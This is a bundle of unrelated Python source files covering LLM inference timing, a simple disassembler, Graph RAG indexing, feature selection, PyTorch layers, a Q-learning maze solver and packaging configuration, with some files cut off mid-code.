    "import time\nimport torch\nimport os\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\n\nmodel_path = \"/leonardo_scratch/large/userexternal/<username>/model/SmolLM-1.7B\"\ntokenizer = AutoTokenizer.from_pretrained(model_path)\nmodel = AutoModelForCausalLM.from_pretrained(model_path).to(\"cuda\")\n\nresult_file = \"/leonardo_scratch/large/userexternal/<username>/dock-exp/result.txt\"\ntime_file = \"/leonardo_scratch/large/userexternal/<username>/dock-exp/time-bench.txt\"\nerror_file = \"/leonardo_scratch/large/userexternal/<username>/dock-exp/error.txt\"\n\nfor file in [result_file, time_file, error_file]:\n    if os.path.exists(file):\n        os.remove(file)\n\ndef make_cached_inference(prompt, cache):\n    if prompt in cache:\n        return cache[prompt], 0\n    start_time = time.time()\n    try:\n        inputs = tokenizer(prompt, return_tensors=\"pt\").to(\"cuda\")\n        outputs = model.generate(inputs[\"input_ids\"], max_length=100)\n        generated_text = tokenizer.decode(outputs[0], skip_special_tokens=True)\n        end_time = time.time()\n        cache[prompt] = generated_text\n        return generated_text, end_time - start_time\n    except Exception as e:\n        with open(error_file, \"w\") as ef:\n            ef.write(str(e))\n        return None, 0\n\ncache = {}\nprompt = \"Alice and Bob\"\nresult, latency = make_cached_inference(prompt, cache)\n\nif result:\n    with open(result_file, \"w\") as rf:\n        rf.write(f\"Generated Text: {result}\")\n    with open(time_file, \"w\") as tf:\n        tf.write(f\"Latency: {latency:.2f} seconds\")\n",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Thurs Jan  1 11:42:47 2025\r\n\r\n@author: IAN CARTER KULANI\r\n\"\"\"\r\n\r\n\r\nfrom colorama import Fore\r\nimport pyfiglet\r\nimport os\r\nfont=pyfiglet.figlet_format(\"BINARY MACHINE CODE\")\r\nprint(Fore.GREEN+font)\r\n\r\n\r\nimport re\r\nfrom capstone import Cs, CS_ARCH_X86, CS_MODE_64\r\n\r\n# Map of Assembly instructions to C/C++ code snippets\r\nassembly_to_c_keywords = {\r\n    \"mov\": \"=\",  # Assembly MOV to C/C++ assignment\r\n    \"add\": \"+=\",\r\n    \"sub\": \"-=\",\r\n    \"mul\": \"*=\",\r\n    \"div\": \"/=\",\r\n    \"jmp\": \"goto\",\r\n    \"cmp\": \"if\",\r\n    \"je\": \"if (condition) {\",  # Simplified representation of conditional jump\r\n    \"jne\": \"if (condition) {\",\r\n    \"jg\": \"if (condition) {\",\r\n    \"jl\": \"if (condition) {\",\r\n    \"call\": \"function_call\",\r\n    \"ret\": \"return\",\r\n    \"imul\": \"*\",\r\n    \"nop\": \"// No operation\"\r\n}\r\n\r\n# C/C++ keywords list (not exhaustive)\r\nc_keywords = [\r\n    \"auto\", \"do\", \"double\", \"long\", \"short\", \"if\", \"else\", \"enum\", \"extern\", \"void\", \r\n    \"volatile\", \"struct\", \"static\", \"int\", \"float\", \"char\", \"sizeof\", \"typedef\", \"signed\", \r\n    \"unsigned\", \"for\", \"while\", \"register\", \"union\", \"goto\", \"_packed\", \"return\"\r\n]\r\n\r\ndef disassemble_machine_code(machine_code, architecture='x86_64'):\r\n    \"\"\"\r\n    Disassemble the given machine code into human-readable assembly language.\r\n    \"\"\"\r\n    if architecture == 'x86_64':\r\n        md = Cs(CS_ARCH_X86, CS_MODE_64)\r\n    else:\r\n        print(\"Unsupported architecture!\")\r\n        return []\r\n\r\n    disassembled_code = []\r\n    for insn in md.disasm(machine_code, 0x1000):  # Starting address is arbitrary\r\n        disassembled_code.append(f\"{insn.mnemonic} {insn.op_str}\")\r\n\r\n    return disassembled_code\r\n\r\ndef convert_to_c_language(assembly_code):\r\n    \"\"\"\r\n    Convert the disassembled assembly code into C/C++ human-readable language.\r\n    \"\"\"\r\n    c_code = []\r\n    \r\n    for line in assembly_code:\r\n        parts = line.split()\r\n        if len(parts) == 0:\r\n            continue\r\n        \r\n        mnemonic = parts[0].lower()\r\n\r\n        # Check if the mnemonic is in the assembly-to-C mapping\r\n        if mnemonic in assembly_to_c_keywords:\r\n            if mnemonic == \"cmp\" or mnemonic == \"je\" or mnemonic == \"jne\" or mnemonic == \"jg\" or mnemonic == \"jl\":\r\n                # Handle conditional jumps (simplified)\r\n                c_code.append(f\"{assembly_to_c_keywords[mnemonic]} {parts[1]} }}\")  # End of if statement\r\n            elif mnemonic == \"jmp\":\r\n                c_code.append(f\"{assembly_to_c_keywords[mnemonic]} {parts[1]};\")\r\n            else:\r\n                c_code.append(f\"{parts[1]} {assembly_to_c_keywords[mnemonic]} {parts[2]};\")\r\n        else:\r\n            c_code.append(f\"// Unrecognized instruction: {line}\")\r\n\r\n    return c_code\r\n\r\ndef print_c_code(c_code):\r\n    \"\"\"\r\n    Print the converted C/C++ code.\r\n    \"\"\"\r\n    print(\"\\nConverted C/C++ Code:\")\r\n    print(\"#include <stdio.h>\\n\")\r\n    print(\"int main() {\")\r\n    \r\n    for line in c_code:\r\n        print(f\"    {line}\")\r\n    \r\n    print(\"    return 0;\\n}\")\r\n\r\ndef main():\r\n    # Ask the user to enter the machine code (in hexadecimal format)\r\n    machine_code_input = input(\"Enter machine code (in hexadecimal format):\").strip()\r\n    \r\n    # Convert the input from hexadecimal to raw bytes\r\n    try:\r\n        machine_code = bytes.fromhex(machine_code_input)\r\n    except ValueError:\r\n        print(\"Invalid machine code format. Please enter valid hexadecimal values.\")\r\n        return\r\n    \r\n    # Disassemble the machine code\r\n    print(\"\\nDisassembling machine code...\\n\")\r\n    disassembled_code = disassemble_machine_code(machine_code)\r\n    \r\n    if not disassembled_code:\r\n        print(\"Error: Could not disassemble the machine code.\")\r\n        return\r\n    \r\n    # Convert the disassembled assembly code to C/C++ code\r\n    c_code = convert_to_c_language(disassembled_code)\r\n    \r\n    # Print the converted C/C++ code\r\n    print_c_code(c_code)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "# interpreter/parser/__init__.py\n\nfrom .parser import Parser\n\n\"\"\"\nParser package for interpreting tokenized source code.\n\nThis package converts the tokenized input from the lexer into an Abstract Syntax Tree (AST), \nwhich represents the structure of the source code.\n\nModules:\n    - parser.py: Contains the `Parser` class, which parses tokens into an AST.\n    - ast.py: Defines the AST structure, including nodes like `Program`, `Statement`, and `Expression`.\n\nUsage:\n    To use the parser, instantiate the `Parser` class with a list of tokens and call its `parse()` method:\n    \n    from interpreter.lexer import lexer\n    from interpreter.parser import parser\n\n    tokens = lexer.tokenize(source_code)\n    parser_instance = parser.Parser(tokens)\n    program = parser_instance.parse()\n\n    The resulting `program` is an AST that represents the source code.\n\nError Handling:\n    Syntax errors encountered during parsing will raise `SyntaxError` exceptions with helpful messages.\n\nNotes:\n    - The parser currently supports a simple subset of Python-like syntax.\n    - Future improvements could include enhanced error recovery and support for more complex syntax.\n\n\"\"\"\n",
    "\"\"\"\nThis file will contain a simple version of Graph RAG, which can be used to index and perform RAG on datasets, providing greater meta-level information about the dataset. This can help LLMs to better understand the dataset and improve their performance. The overall process of constructing the graph is as follows:\n  1. Source Documents -> Text Chunks\n  2. Text Chunks -> Element Instances\n     - Create the graph representation. Extract nodes, edges via an LLM for entity extraction.\n  3. Element Instances -> Element Summaries\n     - Create a summary of each node\n  4. Element Summaries -> Graph Communities\n  5. Graph Communities -> Community Summaries\n\"\"\"\n\nimport os\nfrom typing import Dict, List, Union\nimport json\nimport pickle\nimport collections\nfrom prompts_templates import GRAPH_EXTRACTION_JSON_PROMPT, GRAPH_EXTRACTION_SYSTEM_PROMPT, NODE_SUMMARIZATION_SYSTEM_PROMPT, NODE_SUMMARIZATION_PROMPT, COMMUNITY_SUMMARIZATION_SYSTEM_PROMPT, COMMUNITY_SUMMARIZATION_PROMPT\nfrom utils import clean_json\nfrom operations import run_leiden\nfrom dotenv import load_dotenv\nimport logging\nfrom tqdm import tqdm\nimport time\nimport chromadb\n\nimport networkx as nx\n\nimport google.generativeai as genai # type: ignore\n\nfrom google.generativeai.types.safety_types import ( # type: ignore\n    HarmBlockThreshold,\n    HarmCategory,\n) \n\nload_dotenv()\n\nTEXT_CHUNK_SIZE = 600\n\nN_CHUNKS_IN_ENTITY_BATCH = 10\n\nGOOGLE_API_KEY = os.getenv(\"GOOGLE_API_KEY\")\ngenai.configure(api_key=GOOGLE_API_KEY)\n\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\nclass GraphRAG:\n    def __init__(self):\n        # Initialize the graph structure\n        self.entity_extractor_model = genai.GenerativeModel(\n            \"gemini-1.5-flash-002\",\n            system_instruction=GRAPH_EXTRACTION_SYSTEM_PROMPT,\n            safety_settings={\n                HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT: HarmBlockThreshold.BLOCK_NONE,\n                HarmCategory.HARM_CATEGORY_SEXUALLY_EXPLICIT: HarmBlockThreshold.BLOCK_NONE,\n                HarmCategory.HARM_CATEGORY_HARASSMENT: HarmBlockThreshold.BLOCK_NONE,\n                HarmCategory.HARM_CATEGORY_HATE_SPEECH: HarmBlockThreshold.BLOCK_NONE,\n            }\n        )\n        \n        self.summarizer_model = genai.GenerativeModel(\n            \"gemini-1.5-flash-002\",\n            system_instruction=NODE_SUMMARIZATION_SYSTEM_PROMPT,\n            safety_settings={\n                HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT: HarmBlockThreshold.BLOCK_NONE,\n                HarmCategory.HARM_CATEGORY_SEXUALLY_EXPLICIT: HarmBlockThreshold.BLOCK_NONE,\n                HarmCategory.HARM_CATEGORY_HARASSMENT: HarmBlockThreshold.BLOCK_NONE,\n                HarmCategory.HARM_CATEGORY_HATE_SPEECH: HarmBlockThreshold.BLOCK_NONE,\n            }\n        )\n        \n        self.community_summarizer_model = genai.GenerativeModel(\n            \"gemini-1.5-flash-002\",\n            system_instruction=COMMUNITY_SUMMARIZATION_SYSTEM_PROMPT,\n            safety_settings={\n                HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT: HarmBlockThreshold.BLOCK_NONE,\n                HarmCategory.HARM_CATEGORY_SEXUALLY_EXPLICIT: HarmBlockThreshold.BLOCK_NONE,\n                HarmCategory.HARM_CATEGORY_HARASSMENT: HarmBlockThreshold.BLOCK_NONE,\n                HarmCategory.HARM_CATEGORY_HATE_SPEECH: HarmBlockThreshold.BLOCK_NONE,\n            }\n        )\n        self.chroma_client = chromadb.HttpClient(host='localhost', port=8000)\n\n    def read_documents(self, directory) -> Dict[str, str]:\n        # Read documents from the specified directory\n        documents = dict()\n        for filename in os.listdir(directory):\n            with open(os.path.join(directory, filename), \"r\") as file:\n                documents[filename] = file.read()\n        return documents\n\n    def text_chunks(self, documents: Dict[str, str]) -> Dict[str, List[str]]:\n        # Convert source documents to text chunks\n        text_chunks: Dict[str, List[str]] = dict()\n        for document in documents:\n            text_chunks[document] = []\n            for i in range(0, len(documents[document]), TEXT_CHUNK_SIZE):\n                text_chunks[document].append(documents[document][i:i+TEXT_CHUNK_SIZE])\n        return text_chunks\n\n    def element_instances(self, text_chunks):\n        # Extract nodes and edges to create the graph representation\n        graph_filepath = \"graphs/entities.gpickle\"\n        \n        try:\n            if os.path.exists(graph_filepath):\n                pickled_graph = pickle.load(open(graph_filepath, \"rb\"))\n                return pickled_graph\n        except:\n            logger.info(\"No pickled graph found. Generating a new graph.\")\n            pass\n\n        graph = nx.Graph()\n        start_time = time.time()\n        \n        for document in tqdm(text_chunks, desc=\"Processing documents\"):\n            chunks = text_chunks[document]\n            for i in tqdm(range(0, len(chunks), N_CHUNKS_IN_ENTITY_BATCH), desc=f\"Processing chunk batches for {document}\"",
    "\nimport datasets\nfrom sklearn.feature_extraction.text import CountVectorizer\nfrom sklearn.feature_selection import chi2\nfrom sklearn.feature_selection import SelectKBest\nimport numpy as np\nfrom sklearn.utils import shuffle\n\n\n\ndef get_imdb(train_size=None, test_size=None, seed=42, max_features=20000, features=1000, max_df=0.80, min_df=3, ngram_range_max=3):\n\n    imdb = datasets.load_dataset('imdb')\n    x_train, y_train, x_test, y_test = imdb['train']['text'], imdb['train']['label'], imdb['test']['text'], imdb['test']['label']\n\n\n    if train_size:\n        x_train, y_train = shuffle(x_train, y_train, n_samples=train_size, random_state=seed)\n    if test_size:\n        x_test, y_test = shuffle(x_test, y_test, n_samples=test_size, random_state=seed)\n\n    vectorizer = CountVectorizer(\n        analyzer = 'word',\n        binary=True,\n        ngram_range=(1, ngram_range_max),\n        max_features=max_features,\n        max_df=max_df,\n        min_df=min_df,\n    )\n\n\n    x_train = vectorizer.fit_transform(x_train).toarray().astype(np.uint8)\n    y_train = np.array(y_train).astype(np.uint32)\n    x_test = vectorizer.transform(x_test).toarray().astype(np.uint8)\n    y_test = np.array(y_test).astype(np.uint32)\n\n    \n    SKB = SelectKBest(score_func=chi2, k=features)\n    SKB.fit(x_train, y_train)\n\n    x_train = SKB.transform(x_train)\n    x_test = SKB.transform(x_test)\n\n    return x_train, y_train, x_test, y_test",
    "import torch\nimport torch.nn as nn\nfrom typing import Optional, Union, Callable\n\n\nclass DenseLayer(nn.Module):\n    \"\"\"Configurable dense layer with activation and normalization.\"\"\"\n\n    def __init__(\n        self,\n        in_features: int,\n        out_features: int,\n        activation: Union[str, Callable] = \"relu\",\n        dropout: float = 0.0,\n        batch_norm: bool = False,\n    ):\n        super().__init__()\n        self.layers = nn.ModuleList()\n\n        # Linear transformation\n        self.layers.append(nn.Linear(in_features, out_features))\n\n        # Batch normalization\n        if batch_norm:\n            self.layers.append(nn.BatchNorm1d(out_features))\n\n        # Activation\n        if isinstance(activation, str):\n            activation = getattr(nn, activation.upper())()\n        self.layers.append(activation)\n\n        # Dropout\n        if dropout > 0:\n            self.layers.append(nn.Dropout(dropout))\n\n    def forward(self, x):\n        for layer in self.layers:\n            x = layer(x)\n        return x\n\n\nclass DropoutLayer(nn.Module):\n    \"\"\"Enhanced dropout layer with optional spatial dropout.\"\"\"\n\n    def __init__(self, p: float = 0.5, spatial: bool = False):\n        super().__init__()\n        self.p = p\n        self.spatial = spatial\n        self.dropout = (nn.Dropout2d if spatial else nn.Dropout)(p)\n\n    def forward(self, x):\n        return self.dropout(x)\n\n\nclass NormalizationLayer(nn.Module):\n    \"\"\"Flexible normalization layer supporting multiple types.\"\"\"\n\n    def __init__(self, num_features: int, norm_type: str = \"batch\", **kwargs):\n        super().__init__()\n\n        if norm_type == \"batch\":\n            self.norm = nn.BatchNorm1d(num_features, **kwargs)\n        elif norm_type == \"layer\":\n            self.norm = nn.LayerNorm(num_features, **kwargs)\n        elif norm_type == \"instance\":\n            self.norm = nn.InstanceNorm1d(num_features, **kwargs)\n        else:\n            raise ValueError(f\"Unsupported normalization type: {norm_type}\")\n\n    def forward(self, x):\n        return self.norm(x)\n",
    "\"\"\"\nmodel_def.py\n---------------\nThis file defines the configuration parameters for the EmergentFirmsModel. Each parameter\nhas metadata about its name, type, default value, and a short description.\n\nYou can import and use these definitions in a \u201crun_model.py\u201d or other control-plane modules.\n\"\"\"\n\nMODEL_NAME = \"EmergentFirmsModel\"\nMODEL_VERSION = \"1.0.1\"\n\nPARAMETERS = [\n    {\n        \"name\": \"N\",\n        \"type\": int,\n        \"default\": 600,\n        \"description\": \"Number of agents in the simulation\",\n    },\n    {\n        \"name\": \"churn\",\n        \"type\": float,\n        \"default\": 0.01,\n        \"description\": \"Activation rate for agent decisions in each step\",\n    },\n    {\n        \"name\": \"cost\",\n        \"type\": float,\n        \"default\": 1.0,\n        \"description\": \"Base job-change cost for an agent to move or start a firm\",\n    },\n    {\n        \"name\": \"multiplier\",\n        \"type\": float,\n        \"default\": 2.0,\n        \"description\": \"Multiplier for startup costs when founding a new firm (as opposed to job-change costs)\",\n    },\n    {\n        \"name\": \"savingrate\",\n        \"type\": float,\n        \"default\": 0.03,\n        \"description\": \"Mean savings rate for agents; fraction of wage they put away each time step\",\n    },\n    {\n        \"name\": \"sigma\",\n        \"type\": float,\n        \"default\": 0.01,\n        \"description\": \"Standard deviation for truncated normal distribution of savingrates across agents\",\n    },\n    {\n        \"name\": \"lending\",\n        \"type\": int,\n        \"default\": 1,\n        \"description\": \"Toggle for loan functionality; 1 = on, 0 = off\",\n    },\n    {\n        \"name\": \"lendingrate\",\n        \"type\": float,\n        \"default\": 0.0025,  # ~3% APR if steps are monthly (example)\n        \"description\": \"Interest rate on loans applied each time step (compounded in pay_loans())\",\n    },\n    {\n        \"name\": \"debt_awareness\",\n        \"type\": bool,\n        \"default\": True,\n        \"description\": \"If True, agents consider whether they can repay loans before taking them\",\n    },\n    {\n        \"name\": \"loan_repayment_lookahead\",\n        \"type\": int,\n        \"default\": 12,\n        \"description\": \"Number of steps an agent looks ahead to ensure they can repay a new loan\",\n    },\n    {\n        \"name\": \"loan_risk_factor\",\n        \"type\": int,\n        \"default\": 80,\n        \"description\": \"Percentage of expected wage that the agent assumes they can pay each step\",\n    },\n]\n\nif __name__ == \"__main__\":\n    print(PARAMETERS)",
    "from pathlib import Path\nfrom typing import Literal\nfrom langchain_community.embeddings import OpenAIEmbeddings\nfrom langchain_google_vertexai import VertexAIEmbeddings\nfrom langchain_community.vectorstores import SupabaseVectorStore\nfrom supabase import create_client\nimport PyPDF2\nimport os\n\ndef upload_documents(\n    docs_dir: str,\n    supabase_url: str,\n    supabase_key: str,\n    embedding_provider: Literal[\"openai\", \"vertex\"] = \"openai\",\n    api_key: str = None,\n    project_id: str = None,\n    location: str = None,\n    debug_dir: str = \"debug_output\"\n):\n    supabase = create_client(supabase_url, supabase_key)\n    \n    if embedding_provider == \"openai\":\n        if not api_key:\n            raise ValueError(\"OpenAI API key required\")\n        embeddings = OpenAIEmbeddings(openai_api_key=api_key)\n    elif embedding_provider == \"vertex\":\n        if not all([project_id, location]):\n            raise ValueError(\"project_id and location required for Vertex AI\")\n        embeddings = VertexAIEmbeddings(\n            model_name=\"text-embedding-004\",\n            project=project_id,\n            location=location\n        )\n    else:\n        raise ValueError(f\"Unsupported embedding provider: {embedding_provider}\")\n    \n    vectorstore = SupabaseVectorStore(\n        client=supabase,\n        embedding=embeddings,\n        table_name=\"documents\"\n    )\n    \n    # Create debug directory if it doesn't exist\n    os.makedirs(debug_dir, exist_ok=True)\n    \n    docs_path = Path(docs_dir)\n    for doc_path in docs_path.glob(\"**/*\"):\n        if doc_path.is_file():\n            if doc_path.suffix.lower() == '.pdf':\n                with open(doc_path, 'rb') as f:\n                    pdf_reader = PyPDF2.PdfReader(f)\n                    content = \"\"\n                    # Export each page separately\n                    for i, page in enumerate(pdf_reader.pages):\n                        page_text = page.extract_text()\n                        content += page_text + \"\\n\"\n                        debug_path = Path(debug_dir) / f\"{doc_path.stem}_page_{i+1}.txt\"\n                        with open(debug_path, 'w', encoding='utf-8') as debug_file:\n                            debug_file.write(page_text)\n            else:\n                with open(doc_path, 'r', encoding='latin-1') as f:\n                    content = f.read()\n                    debug_path = Path(debug_dir) / f\"{doc_path.stem}_content.txt\"\n                    with open(debug_path, 'w', encoding='utf-8') as debug_file:\n                        debug_file.write(content)\n            \n            metadata = {\n                \"source\": str(doc_path),\n                \"filename\": doc_path.name\n            }\n            content = content.replace('\\x00', '')\n            \n            # Export final processed content\n            final_debug_path = Path(debug_dir) / f\"{doc_path.stem}_final.txt\"\n            with open(final_debug_path, 'w', encoding='utf-8') as debug_file:\n                debug_file.write(content)\n                \n            vectorstore.add_texts([content], metadatas=[metadata])",
    "# This file was auto-generated by Fern from our API Definition.\n\nfrom typing import IO, Dict, List, Mapping, Optional, Tuple, Union, cast\n\n# File typing inspired by the flexibility of types within the httpx library\n# https://github.com/encode/httpx/blob/master/httpx/_types.py\nFileContent = Union[IO[bytes], bytes, str]\nFile = Union[\n    # file (or bytes)\n    FileContent,\n    # (filename, file (or bytes))\n    Tuple[Optional[str], FileContent],\n    # (filename, file (or bytes), content_type)\n    Tuple[Optional[str], FileContent, Optional[str]],\n    # (filename, file (or bytes), content_type, headers)\n    Tuple[\n        Optional[str],\n        FileContent,\n        Optional[str],\n        Mapping[str, str],\n    ],\n]\n\n\ndef convert_file_dict_to_httpx_tuples(\n    d: Dict[str, Union[File, List[File]]],\n) -> List[Tuple[str, File]]:\n    \"\"\"\n    The format we use is a list of tuples, where the first element is the\n    name of the file and the second is the file object. Typically HTTPX wants\n    a dict, but to be able to send lists of files, you have to use the list\n    approach (which also works for non-lists)\n    https://github.com/encode/httpx/pull/1032\n    \"\"\"\n\n    httpx_tuples = []\n    for key, file_like in d.items():\n        if isinstance(file_like, list):\n            for file_like_item in file_like:\n                httpx_tuples.append((key, file_like_item))\n        else:\n            httpx_tuples.append((key, file_like))\n    return httpx_tuples\n\n\ndef with_content_type(*, file: File, default_content_type: str) -> File:\n    \"\"\"\n    This function resolves to the file's content type, if provided, and defaults\n    to the default_content_type value if not.\n    \"\"\"\n    if isinstance(file, tuple):\n        if len(file) == 2:\n            filename, content = cast(Tuple[Optional[str], FileContent], file)  # type: ignore\n            return (filename, content, default_content_type)\n        elif len(file) == 3:\n            filename, content, file_content_type = cast(Tuple[Optional[str], FileContent, Optional[str]], file)  # type: ignore\n            out_content_type = file_content_type or default_content_type\n            return (filename, content, out_content_type)\n        elif len(file) == 4:\n            filename, content, file_content_type, headers = cast(  # type: ignore\n                Tuple[Optional[str], FileContent, Optional[str], Mapping[str, str]], file\n            )\n            out_content_type = file_content_type or default_content_type\n            return (filename, content, out_content_type, headers)\n        else:\n            raise ValueError(f\"Unexpected tuple length: {len(file)}\")\n    return (None, file, default_content_type)\n",
    "from PyInstaller.utils.hooks import collect_data_files\nimport os\nimport site\nimport tkinterdnd2\n\n# \u83b7\u53d6 tkdnd \u5e93\u6587\u4ef6\u8def\u5f84\ntkdnd_path = os.path.join(os.path.dirname(tkinterdnd2.__file__), 'tkdnd')\n\n# \u6307\u5b9a\u9700\u8981\u6392\u9664\u7684\u6a21\u5757\nexcludes = [\n    'matplotlib', 'numpy', 'pandas', 'scipy', 'PIL._webp',\n    'PIL.ImageQt', 'PyQt5', 'PySide2', 'wx', 'IPython',\n    'notebook', 'pytest', 'sphinx', 'docutils', 'jedi',\n    'setuptools'\n]\n\n# \u6307\u5b9a\u9700\u8981\u7684\u9690\u85cf\u5bfc\u5165\nhiddenimports = [\n    'tkinter',\n    'tkinter.ttk',\n    'tkinterdnd2'\n]\n\n# \u83b7\u53d6 tkdnd \u76f8\u5173\u6587\u4ef6\ntkdnd_files = []\nif os.path.exists(tkdnd_path):\n    for root, dirs, files in os.walk(tkdnd_path):\n        for file in files:\n            full_path = os.path.join(root, file)\n            rel_path = os.path.relpath(full_path, os.path.dirname(tkdnd_path))\n            tkdnd_files.append((full_path, os.path.join('tkdnd', rel_path)))\n\n# \u521b\u5efa spec \u6587\u4ef6\u7684\u914d\u7f6e\na = Analysis(\n    ['silence_remover.py'],\n    pathex=[],\n    binaries=tkdnd_files,  # \u6dfb\u52a0 tkdnd \u6587\u4ef6\n    datas=[\n        ('icon.png', '.'),\n    ],\n    hiddenimports=hiddenimports,\n    hookspath=[],\n    runtime_hooks=[],\n    excludes=excludes,\n    win_no_prefer_redirects=False,\n    win_private_assemblies=False,\n    noarchive=False\n)\n\npyz = PYZ(a.pure, a.zipped_data)\n\nexe = EXE(\n    pyz,\n    a.scripts,\n    a.binaries,\n    a.zipfiles,\n    a.datas,\n    name='\u81ea\u52a8\u526a\u8f91\u6c14\u53e3\u5de5\u5177',\n    debug=False,\n    bootloader_ignore_signals=False,\n    strip=False,\n    upx=True,\n    upx_exclude=[],\n    runtime_tmpdir=None,\n    console=False,\n    icon='icon.ico'\n) ",
    "import random\nimport numpy as np\nimport pre\nfrom PIL import Image\nimport matplotlib.pyplot as plt\nimport os\n\n\nclass Maze:\n    def __init__(self, maze, start_position, final_position):\n        self.maze = maze\n        self.rows = maze.shape[0]\n        self.cols = maze.shape[1]\n        self.n_states = self.rows * self.cols\n        self.n_actions = 4 # up down left right\n        self.start_position = start_position\n        self.final_position = final_position\n    \n    def __getitem__(self, index):\n        return self.maze[index]\n\n    def get_state(self, position):\n        return position[0] * self.cols + position[1]\n    \n    def get_position(self, state):\n        return (state // self.cols, state % self.cols)\n    \n    def is_valid_position(self, position): # 1 is the way and 0 is the wall\n        return (0 <= position[0] < self.rows) and (0 <= position[1] < self.cols)\n    \n    def get_new_state(self, state, action):\n        position = self.get_position(state)\n        if action == 0: # up\n            new_position = (position[0] - 1, position[1])\n        elif action == 1: # down\n            new_position = (position[0] + 1, position[1])\n        elif action == 2: # left\n            new_position = (position[0], position[1] - 1)\n        else: # right\n            new_position = (position[0], position[1] + 1)\n    \n        if self.is_valid_position(new_position):\n            return self.get_state(new_position)\n        else:\n            return state\n        \n    def get_reward(self, state):\n        position = self.get_position(state)\n        x, y = position\n        bound = int(self.n_states / 2) # estimation of path\n        if not self.is_valid_position(position):\n            return -1000\n        if position == self.final_position:\n            return 1000\n        elif self.maze[x][y] == 0:\n            return -bound\n        else:\n            return -1\n\n\ndef initialize_q_table(n_states, n_actions):\n    return np.zeros((n_states, n_actions))\n\ndef choose_action_index(state, q_table, epsilon):\n    if random.uniform(0,1) < epsilon:\n        return random.randint(0, 3)\n    else:\n        return np.argmax(q_table[state, :])\n    \ndef update_q_table(q_table, state, new_state, action_index, alpha, reward, gamma):\n    best_new_action_index = np.argmax(q_table[new_state, :])\n    q_table[state, action_index] += alpha * (reward + gamma * q_table[new_state, best_new_action_index] - q_table[state, action_index])\n\ndef train_loop(maze, episodes, alpha, gamma, epsilon, min_epsilon = 0.01, decay_rate = 0.995):\n    q_table = initialize_q_table(maze.n_states, maze.n_actions)\n    for _ in range(episodes):\n        state = maze.get_state(maze.start_position)\n        steps = 0\n        while state != maze.get_state(maze.final_position):\n            action_index = choose_action_index(state, q_table, epsilon)\n            new_state = maze.get_new_state(state, action_index)\n            reward = maze.get_reward(new_state)\n            update_q_table(q_table, state, new_state, action_index, alpha, reward, gamma)\n            state = new_state\n            steps += 1\n            if steps > maze.n_states * 2:\n                break\n        epsilon = max(min_epsilon, epsilon * decay_rate)\n    return q_table\n\ndef find_path(maze, q_table):\n    path = [maze.start_position]\n    state = maze.get_state(maze.start_position)\n    steps = 0\n    while state != maze.get_state(maze.final_position):\n        action_index = np.argmax(q_table[state, :])\n        new_state = maze.get_new_state(state, action_index)\n        new_position = maze.get_position(new_state)\n        if new_state == state or maze[new_position[0]][new_position[1]] == 0:\n            return None\n        else:\n            path.append(maze.get_position(new_state))\n        state = new_state\n        steps += 1\n        if steps > maze.n_states * 2:\n            return None\n    return path\n\ndef display_maze_with_path(maze_matrix, path, start_point, final_point):\n    fig, ax = plt.subplots(figsize=(8, 8))\n    # Show the maze image, set origin = 'upper', makes sure (0,0) is in the upper left corner.\n    ax.imshow(maze_matrix, cmap='gray', origin='upper')\n    \n    # Mark the starting point.\n    ax.scatter(start_point[1], start_point[0], marker='o', color='green', s=100, label='Start')\n    \n    # Mark the final point.\n    if final_point:\n        ax.scatter(final_point[1], final_point[0], marker='x', color='red', s=100, label='End')\n    \n    # Draw paths.\n    if path:\n        path_y = [pos[1] for pos in path]\n        path_x = [pos[0] for pos in path]\n        ax.plot(path_y, path_x, color='blue', linewidth=2, label='Path')\n    \n    # Add legends.\n    ax.legend(loc='upper right')\n    \n    # Hide axis scale.\n    ax.set_xticks([])\n    ax.set_yticks([])\n    \n    plt.title(\"Maze Path\")\n    plt.show()\n\ndef on_click(event, maze_matrix_block, maze, start_point):\n    if event.inaxes:\n        # Get the coordinates of the mouse click.\n        x, y = int(round(event.ydata)), int(round(event.xdata))\n        print(f\"Clicked coordinates: ",
    "from __future__ import annotations\n\nimport pandas as pd\n\nfrom dataclr.methods.filter_method import FilterMethod\n\n\nclass ZScore(FilterMethod):\n    \"\"\"\n    Z-Score filter method for feature selection.\n\n    This method evaluates the importance of features by calculating the mean of the\n    absolute Z-scores for each feature. Features with higher mean absolute Z-scores\n    are considered more informative.\n\n    Inherits from:\n        :class:`FilterMethod`: The base class that provides the structure for filter\n                              methods.\n    \"\"\"\n\n    def fit(self, X_train: pd.DataFrame, y_train: pd.Series = pd.Series()) -> ZScore:\n        \"\"\"\n        Computes the mean absolute Z-score for each feature and ranks them in\n        descending order.\n\n        Args:\n            X_train (pd.DataFrame): Feature matrix of the training data.\n            y_train (pd.Series, optional): Target variable of the training data. Not\n                                           used in this method but included for\n                                           compatibility. Defaults to an empty Series.\n\n        Returns:\n            ZScore: The fitted instance with ranked features stored in\n            ``self.ranked_features_``.\n        \"\"\"\n        z_scores = X_train.apply(lambda x: (x - x.mean()) / x.std(ddof=0))\n\n        mean_abs_z_scores = z_scores.abs().mean()\n\n        self.ranked_features_ = pd.Series(\n            mean_abs_z_scores, index=X_train.columns\n        ).sort_values(ascending=False)\n\n        return self\n",
    "from diffusers import LTXPipeline\nimport torch.utils.benchmark as benchmark_pt\nimport torch\nimport json\nimport argparse\n\n\ndef benchmark_fn(f, *args, **kwargs):\n    t0 = benchmark_pt.Timer(\n        stmt=\"f(*args, **kwargs)\",\n        globals={\"args\": args, \"kwargs\": kwargs, \"f\": f},\n        num_threads=torch.get_num_threads(),\n    )\n    return f\"{(t0.blocked_autorange().mean):.3f}\"\n\n\ndef run_inference(pipe, prompt_embeds, **kwargs):\n    _ = pipe(**prompt_embeds, generator=torch.manual_seed(0), output_type=\"latent\", **kwargs)\n\n\ndef run_benchmark(pipe, args, prompt_embeds):\n    for _ in range(5):\n        run_inference(pipe, prompt_embeds)\n\n    width, height = args.resolution.split(\"x\")[::-1]\n    time = benchmark_fn(\n        run_inference, pipe, prompt_embeds, num_frames=args.num_frames, width=int(width), height=int(height)\n    )\n\n    info = dict(num_frames=args.num_frames, width=int(width), height=int(height), time=time)\n    path = f\"{args.num_frames}x{height}x{width}\"\n    path += \"_q8\" if args.q8_transformer_path else \"\"\n    path += \"_compile\" if 